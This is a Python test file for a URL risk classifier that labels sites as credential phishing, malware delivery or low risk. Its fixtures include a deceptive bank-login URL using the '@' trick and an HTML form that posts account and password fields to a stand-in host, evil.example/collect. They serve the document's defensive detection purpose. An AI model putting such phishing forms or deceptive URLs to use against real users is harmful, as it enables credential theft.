from __future__ import annotations

from cybershield_ai.risk_tagging import infer_risk_category


def test_infer_risk_category_detects_credential_phishing() -> None:
    result = infer_risk_category(
        raw_url="http://secure-login-bank.com@hack.it/verify",
        normalized_url="http://secure-login-bank.com@hack.it/verify",
        hostname="hack.it",
        registered_domain="hack.it",
        features={
            "having_At_Symbol": -1,
            "SFH": -1,
            "Redirect": 0,
            "having_Sub_Domain": 1,
            "URL_Length": -1,
            "Prefix_Suffix": 1,
            "Shortining_Service": 1,
            "having_IP_Address": 1,
            "HTTPS_token": 1,
            "Submitting_to_email": 1,
        },
        html="""
        <html>
            <body>
                <form action="http://evil.example/collect">
                    <input type="text" name="account" />
                    <input type="password" name="password" />
                </form>
            </body>
        </html>
        """,
        response_headers={"content-type": "text/html"},
        redirect_count=0,
    )

    assert result["risk_category"] == "credential_phishing"
    assert result["risk_signals"]


def test_infer_risk_category_detects_malware_delivery() -> None:
    result = infer_risk_category(
        raw_url="http://download-fast.example.com/setup.exe",
        normalized_url="http://download-fast.example.com/setup.exe",
        hostname="download-fast.example.com",
        registered_domain="example.com",
        features={
            "having_At_Symbol": 1,
            "SFH": 1,
            "Redirect": 0,
            "having_Sub_Domain": 0,
            "URL_Length": 0,
            "Prefix_Suffix": -1,
            "Shortining_Service": 1,
            "having_IP_Address": 1,
            "HTTPS_token": 1,
            "Submitting_to_email": 1,
        },
        html='<a href="/setup.exe">Download now</a>',
        response_headers={
            "content-type": "application/octet-stream",
            "content-disposition": "attachment; filename=setup.exe",
        },
        redirect_count=0,
    )

    assert result["risk_category"] == "malware_delivery"


def test_infer_risk_category_returns_low_risk_when_signals_are_sparse() -> None:
    result = infer_risk_category(
        raw_url="https://docs.python.org/3/",
        normalized_url="https://docs.python.org/3/",
        hostname="docs.python.org",
        registered_domain="python.org",
        features={
            "having_At_Symbol": 1,
            "SFH": 1,
            "Redirect": 0,
            "having_Sub_Domain": 0,
            "URL_Length": 1,
            "Prefix_Suffix": 1,
            "Shortining_Service": 1,
            "having_IP_Address": 1,
            "HTTPS_token": 1,
            "Submitting_to_email": 1,
        },
        html="<html><body><h1>Python Documentation</h1></body></html>",
        response_headers={"content-type": "text/html"},
        redirect_count=0,
    )

    assert result["risk_category"] == "low_risk"
